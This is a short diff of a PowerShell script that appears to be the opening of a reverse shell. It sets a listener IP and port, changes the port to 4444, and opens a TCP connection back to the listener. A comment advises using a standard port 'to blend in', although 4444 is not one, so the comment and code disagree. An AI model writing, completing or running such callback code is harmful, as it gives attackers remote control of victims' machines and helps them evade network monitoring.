@@ -1,6 +1,6 @@
 # Configuration
 $TargetIP = "10.211.55.5"   # Replace with your listener IP
-$TargetPort = "8080"           # Use a standard port to blend in (e.g., HTTPS)
+$TargetPort = 4444           # Use a standard port to blend in (e.g., HTTPS)
 
 # Create the TCP connection using native .NET classes
 $TcpClient = New-Object System.Net.Sockets.TcpClient($TargetIP, $TargetPort)
